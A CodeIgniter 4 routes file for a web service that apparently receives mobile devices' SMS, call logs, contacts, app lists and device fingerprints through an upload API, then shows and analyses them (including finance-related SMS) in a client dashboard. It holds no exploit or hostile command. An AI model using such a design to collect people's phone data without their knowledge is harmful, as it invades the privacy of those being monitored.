<?php

use CodeIgniter\Router\RouteCollection;

/**
 * @var RouteCollection $routes
 */

// =================================================================
// 1. PUBLIC ROUTES (Landing Pages)
//    Routes for the main public-facing website, often handled by the Home controller.
// =================================================================

// Base URL: The default route
$routes->get('/', 'Home::index', ['as' => 'home']);

// General landing/marketing pages
$routes->get('landing', 'Home::index', ['as' => 'landing']);
$routes->get('download', 'Home::landing_download');
$routes->get('aboutus', 'Home::landing_aboutus');
$routes->get('faqs_terms', 'Home::landing_faqs');
$routes->get('how_to', 'Home::landing_how_to');
$routes->get('error_404', 'Home::landing_error_404');
$routes->get('prices', 'Home::landing_prices');

// Contact Form (handles both GET for view and POST for submission)
$routes->match(['get', 'post'], 'contactus', 'Home::landing_contactus');

// =================================================================
// 2. AUTHENTICATION ROUTES (CI4 Shield)
// =================================================================

// Shield's built-in routes. This loads many routes for registration, verification, etc.
service('auth')->routes($routes);

// Custom Authentication Routes:
// This group is often used to ensure your custom controllers (auth\LoginController, etc.)
// are used instead of the default Shield controllers.
$routes->group('', ['namespace' => 'App\Controllers'], static function ($routes) {
    // Login
    $routes->get('login', 'auth\LoginController::loginView', ['as' => 'login']);
    $routes->post('login', 'auth\LoginController::loginAction');
    $routes->get('logout', 'auth\LoginController::logoutAction', ['as' => 'logout']);

    // Registration
    $routes->get('register', 'auth\RegisterController::registerView', ['as' => 'register']);
    $routes->post('register', 'auth\RegisterController::registerAction');

    // Forgot Password
    $routes->get('forgot', 'auth\ForgotPasswordController::forgotView', ['as' => 'forgot']);
    $routes->post('forgot', 'auth\ForgotPasswordController::forgotAction');

    // Reset Password
    $routes->get('reset-password', 'auth\ForgotPasswordController::resetView', ['as' => 'reset-password']);
    $routes->post('reset-password', 'auth\ForgotPasswordController::resetAction');
});

// =================================================================
// 3. CLIENT/DASHBOARD ROUTES
//    Grouped under the 'clients' namespace and should typically be protected by a filter
//    (like 'session' or 'auth:session').
// =================================================================

$routes->group('', ['namespace' => 'App\Controllers\clients', 'filter' => 'session'], static function ($routes) {

    // --- General Client Pages ---
    $routes->get('home', 'Client::home', ['as' => 'client-home']);
    $routes->get('faqs', 'Client::faqs');

    // =============================================================
    // DATA VIEWS WITH PAGINATION
    // =============================================================

    // --- Data Views (Apps) ---
    $routes->get('apps', 'Apps::apps');
    $routes->get('apps/(:num)', 'Apps::apps/$1'); // Pagination
    $routes->get('apps/unique', 'Apps::apps_unique');
    $routes->get('apps/unique/(:num)', 'Apps::apps_unique/$1'); // Pagination
    $routes->get('apps/last_time', 'Apps::apps_last_time');
    $routes->get('apps/last_time/(:num)', 'Apps::apps_last_time/$1'); // Pagination
    $routes->get('apps/all_apps', 'Apps::apps_all');
    $routes->get('apps/all_apps/(:num)', 'Apps::apps_all/$1'); // Pagination

    // --- Data Views (Call Logs) ---
    $routes->get('call_logs', 'Calls::call_logs');
    $routes->get('call_logs/(:num)', 'Calls::call_logs/$1'); // Pagination
    $routes->get('call_logs/incoming', 'Calls::call_incoming');
    $routes->get('call_logs/incoming/(:num)', 'Calls::call_incoming/$1'); // Pagination
    $routes->get('call_logs/outgoing', 'Calls::call_outgoing');
    $routes->get('call_logs/outgoing/(:num)', 'Calls::call_outgoing/$1'); // Pagination
    $routes->get('call_logs/rejected', 'Calls::call_rejected');
    $routes->get('call_logs/rejected/(:num)', 'Calls::call_rejected/$1'); // Pagination
    $routes->get('call_logs/blocked', 'Calls::call_blocked');
    $routes->get('call_logs/blocked/(:num)', 'Calls::call_blocked/$1'); // Pagination

    // --- Data Views (SMS) ---
    $routes->get('sms', 'Sms::sms');
    $routes->get('sms/(:num)', 'Sms::sms/$1'); // Pagination
    $routes->get('sms/inbox', 'Sms::sms_inbox');
    $routes->get('sms/inbox/(:num)', 'Sms::sms_inbox/$1'); // Pagination
    $routes->get('sms/sent', 'Sms::sms_sent');
    $routes->get('sms/sent/(:num)', 'Sms::sms_sent/$1'); // Pagination

    // --- Data Views (Contacts) ---
    $routes->get('contacts', 'Contacts::index');
    $routes->get('contacts/(:num)', 'Contacts::index/$1'); // Pagination

    // =============================================================
    // ANALYSIS/CORRELATION ROUTES (WITH PAGINATION)
    // =============================================================

    // --- Analysis/Correlation ---
    $routes->get('analysis', 'Correlation::index');
    $routes->get('analysis/(:num)', 'Correlation::index/$1'); // Pagination

    $routes->get('analysis/sms/finance', 'Correlation::sms_finance');
    $routes->get('analysis/sms/finance/(:num)', 'Correlation::sms_finance/$1'); // Pagination

    $routes->get('analysis/sms/finance/(:any)', 'Correlation::sms_analyze_finance_from/$1');
    $routes->get('analysis/sms/finance/(:any)/(:num)', 'Correlation::sms_analyze_finance_from/$1/$2'); // Pagination

    $routes->get('analysis/set_rules', 'Correlation::set_sms_rules');
    $routes->get('analysis/set_rules/(:num)', 'Correlation::set_sms_rules/$1'); // Pagination

    $routes->post('analysis/set/set_sms_datapoints/(:any)', 'Correlation::set_sms_datapoints/$1');

    // --- Contact Analysis (Dynamic) ---
    $routes->get('contacts/analyze/sms/(:any)', 'Analyze::sms/$1');
    $routes->get('contacts/analyze/sms/(:any)/(:num)', 'Analyze::sms/$1/$2'); // Pagination

    $routes->get('contacts/analyze/calls/(:any)', 'Analyze::calls/$1');
    $routes->get('contacts/analyze/calls/(:any)/(:num)', 'Analyze::calls/$1/$2'); // Pagination

    // =============================================================
    // ACCOUNT MANAGEMENT ROUTES (UPDATED)
    // =============================================================

    // Account Profile & Settings Group
    $routes->group('account', function($routes) {
        // Profile Pages (GET)
        $routes->get('home', 'Account::home', ['as' => 'account-profile']);
        $routes->get('profile', 'Account::home'); // Alias for backward compatibility
        $routes->get('setting', 'Account::setting', ['as' => 'account-settings']);
        $routes->get('access_logs', 'Account::access_logs', ['as' => 'account-logs']);
        $routes->get('logs', 'Account::access_logs'); // Alias for backward compatibility
        $routes->get('access_logs/(:num)', 'Account::access_logs/$1'); // Pagination
        $routes->get('devices', 'Account::devices', ['as' => 'account-devices']);

        // Profile Actions (POST)
        $routes->post('updateProfile', 'Account::updateProfile', ['as' => 'account-update']);
        $routes->post('regenerateToken', 'Account::regenerateToken', ['as' => 'account-regenerate-token']);

        // Data Export (GET)
        $routes->get('exportData/(:any)', 'Account::exportData/$1', ['as' => 'account-export']);

        // Data Deletion (GET for confirmation, POST for actual deletion)
        $routes->get('deleteData/(:any)', 'Account::deleteData/$1', ['as' => 'account-delete-confirm']);
        $routes->post('deleteData/(:any)', 'Account::deleteData/$1', ['as' => 'account-delete']);

        // Legacy Profile Actions (kept for backward compatibility)
        $routes->match(['get', 'post'], 'profile/update', 'Profile::profile_update');
        $routes->match(['get', 'post'], 'profile/image_upload', 'Profile::profile_upload');
        $routes->post('setting/token_generate', 'Profile::token_generate');

        // Legacy Data Deletion (POST only for backward compatibility)
        $routes->post('data/del/apps', 'Profile::profile_del_apps');
        $routes->post('data/del/call_logs', 'Profile::profile_del_call_logs');
        $routes->post('data/del/contacts', 'Profile::profile_del_contacts');
        $routes->post('data/del/sms', 'Profile::profile_del_sms');
    });

    // --- Other Account Actions ---
    $routes->match(['get', 'post'], 'account/requests', 'Requests::send_request');
    $routes->match(['get', 'post'], 'account/requests/sleep', 'Requests::send_sleep');
});

// =================================================================
// 4. API/WEBHOOK ROUTES
//    These typically require an API key/token and should be protected by a filter
//    like 'tokens' or a custom API key middleware.
// =================================================================
$routes->group('api/v1', [
    'namespace' => 'App\\Controllers\\api\\v1',
    'filter'    => 'throttle',
], static function ($routes) {
    // Upload encrypted/text files from mobile devices
    $routes->post('files/upload', 'Receive::upload');

    // Verify device/user token
    $routes->post('token/verify', 'Receive::token_verify');

    // Receive device fingerprint / print information
    $routes->post('device/print', 'Receive::device_print');
});

// =================================================================
// 5. ADMIN ROUTES (Optional - if you have an admin section)
// =================================================================
$routes->group('admin', ['namespace' => 'App\Controllers\admin', 'filter' => 'role:admin'], static function ($routes) {
    $routes->get('dashboard', 'Dashboard::index');
    $routes->get('users', 'Users::index');
    $routes->get('users/(:num)', 'Users::index/$1');
    $routes->get('logs', 'Logs::index');
    $routes->get('logs/(:num)', 'Logs::index/$1');
});

// =================================================================
// 6. CATCH-ALL ROUTE FOR 404 ERRORS
// =================================================================
$routes->set404Override(function() {
    return redirect()->to('/error_404');
});

// Alternatively, you can specify a controller method:
// $routes->set404Override('Home::landing_error_404');